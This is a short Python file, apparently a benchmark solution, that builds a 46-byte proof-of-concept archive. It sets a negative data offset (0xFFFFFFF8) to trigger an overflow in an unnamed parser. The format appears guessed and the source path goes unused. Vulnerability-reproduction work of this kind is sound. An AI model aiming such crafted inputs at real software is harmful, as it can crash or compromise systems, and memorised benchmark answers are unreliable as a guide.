import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal archive that triggers negative offset
        # Format: [magic(4)][header_size(4)][data_offset(4)][data_size(4)][...]
        
        # Magic header
        poc = b'ARC\x01'
        
        # Header size (positive value)
        poc += struct.pack('<I', 32)
        
        # Data offset - set to negative value to trigger overflow
        # -8 in two's complement 32-bit
        poc += struct.pack('<I', 0xFFFFFFF8)
        
        # Data size - small value
        poc += struct.pack('<I', 4)
        
        # Fill with some data to reach 46 bytes
        poc += b'A' * (46 - len(poc))
        
        return poc[:46]